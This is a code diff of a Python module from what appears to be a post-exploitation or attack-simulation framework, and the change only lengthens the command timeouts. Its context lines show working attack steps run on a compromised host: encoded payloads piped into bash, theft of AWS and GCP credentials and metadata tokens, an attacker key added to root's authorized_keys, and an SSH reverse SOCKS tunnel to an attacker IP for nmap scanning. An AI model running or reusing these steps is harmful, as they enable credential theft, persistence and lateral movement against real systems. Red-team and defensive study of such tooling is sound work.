@@ -41,7 +41,7 @@ class Module(BaseModule):
                 log("payload loaded and ready")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_linpeas | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 log(result)
 
             def exfiltrate(csp):
@@ -69,7 +69,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     log("creating an instance creds profile...")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awsconfig | base64 -d | /bin/bash'",
-                        cwd="/tmp", timeout=900)
+                        cwd="/tmp", timeout=7200)
                     log(result)
 
                     # remove any pre-existing cred archived
@@ -82,7 +82,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     log("running credentials find...")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'",
-                        cwd="/tmp", timeout=900)
+                        cwd="/tmp", timeout=7200)
                     log(result)
 
                     # create an archive of all aws creds
@@ -91,7 +91,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                     log("payload loaded and ready")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
-                        cwd="/tmp", timeout=900)
+                        cwd="/tmp", timeout=7200)
                     log(result)
                 elif csp == "gcp":
                     # get instance metadata
@@ -99,7 +99,7 @@ aws configure set output json --profile=$PROFILE'''.encode('utf-8'))
                         b"curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancemetadata | base64 -d | /bin/bash'",
-                        cwd="/tmp", timeout=900)
+                        cwd="/tmp", timeout=7200)
                     log(result)
                     # get instance token
                     # example usage: curl https://compute.googleapis.com/compute/v1/projects/PROJECT_ID/zones/ZONE/instances -H "Authorization":"Bearer ACCESS_TOKEN"
@@ -109,7 +109,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
 ''')
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_instancetoken | base64 -d | /bin/bash'",
-                        cwd="/tmp", timeout=900)
+                        cwd="/tmp", timeout=7200)
                     log(result)
 
                     # remove any pre-existing cred archived
@@ -122,7 +122,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     log("running credentials find...")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_gcpcredsfind | base64 -d | /bin/bash'",
-                        cwd="/tmp", timeout=900)
+                        cwd="/tmp", timeout=7200)
                     log(result)
 
                     # create an archive of all gcp creds
@@ -365,7 +365,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 target_lan = bytes(result.stdout).decode().strip()
                 log(f'Target LAN: {target_lan}')
 
@@ -376,7 +376,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                         f2.write(f1.read())
                 result = session.platform.run(
                     "/bin/bash -c 'chmod 0600 /tmp/sockskey'",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 log("adding public key to authorized on target...")
                 with open('/home/socksuser/.ssh/socksuser_key.pub', 'rb') as f1:
                     with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
@@ -388,7 +388,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 log(f'Result: {result.returncode}')
 
                 # forward local socksproxy to attacker
@@ -397,7 +397,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                     f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 log(f'Result: {result.returncode}')
 
                 # run nmap scan via proxychains
@@ -413,7 +413,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 log('killing ssh socksproxy and portforward...')
                 result = session.platform.run(
                     'kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)',
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 log(f'Result: {result.returncode}')
 
                 # remove temporary archive from target
@@ -446,7 +446,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 log("payload loaded and ready")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
             elif task_name == "kube2s3":
                 # create work directory
                 task_path = Path(f"/{task_name}")
@@ -464,7 +464,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 session.log("running scan payload...")
                 result = session.platform.run(
                     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kube2s3 | base64 -d | /bin/bash'",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 session.log(result)
 
                 files = ["/tmp/kube_bucket.tgz"]
@@ -488,7 +488,7 @@ echo $ACCESS_TOKEN > /tmp/instance_access_token.json
                 # update to add 15 minute timeout
                 result = session.platform.run(
                     "${default_payload}",
-                    cwd="/tmp", timeout=900)
+                    cwd="/tmp", timeout=7200)
                 log(f'Result: {result.returncode}')
 
             log("Removing sesssion lock...")
